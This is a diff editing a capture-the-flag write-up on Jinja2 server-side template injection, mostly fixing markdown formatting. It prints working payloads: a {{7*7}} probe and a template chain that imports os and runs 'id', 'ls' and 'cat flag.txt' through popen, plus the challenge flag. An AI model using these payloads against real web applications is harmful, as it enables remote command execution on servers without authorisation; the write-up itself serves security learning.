@@ -27,12 +27,14 @@ In your research, you've uncovered some basic examples of Jinja2 SSTI, including
 #### Exploit Test
 
 1. **Test Payload:** Jinja2 - Basic Injection Test.
+
    ![Payload](/1.png)
-   *Description: {{7*7}}*
+
+   *Description: `{{7*7}}`*
 
 2. **Test Result:** The application responds with the output of the '{{7*7}}' command.
+
    ![Result](/2Capture%20d'écran%202023-11-18%20220633.png)
-   *Description: 49*
 
 These examples further reinforce the likelihood of Jinja2 usage and provide a starting point for crafting specific SSTI payloads tailored to this template engine.
 
@@ -45,28 +47,35 @@ After confirming the presence of SSTI in the web application, the next step is t
 ```
 
 1. **Test Payload:** Exploit the SSTI by calling os.popen().read().
+
    ![Payload]!(/3.png)
-   *Description: {{ self.**init**.**globals**.**builtins**.**import**('os').popen('id').read() }}*
+
+   *Description: {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}*
 
 2. **Test Result:** The application responds with the output of the 'id' command.
+
    ![Result](/4.png)
+
    *Description: Confirm that the application responds with the output of the 'id' command, indicating successful SSTI execution.*
 
 3. **Directory Listing**
    - **Payload:** Modify the payload to list the contents of the current directory using `ls`.
+
      ![Payload]!(/5.png)
 
    - **Test Result:** Execute the payload and observe the result to see the files and directories in the current location.
+
      ![Result](/6.png)
+
 4. **Read Flag Contents**
    - **Payload:** Modify the payload to cat the contents of `flag.txt`.
 
      ```jinja
      {{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}
      ```
-     ![Payload]!(/7.png)
+    ![Payload]!(/7.png)
 
-   *Description: {{ self.**init**.**globals**.**builtins**.**import**('os').popen('cat flag.txt').read() }}*
-
-   - **Test Result:** Execute the payload and observe the result to read the contents of the `flag.txt` file : Securinets{55t1_D0N3}.
+   - **Test Result:** Execute the payload and observe the result to read the contents of the `flag.txt` file : `Securinets{55t1_D0N3}`.
+   
     ![Result]!(/8.png)
+   
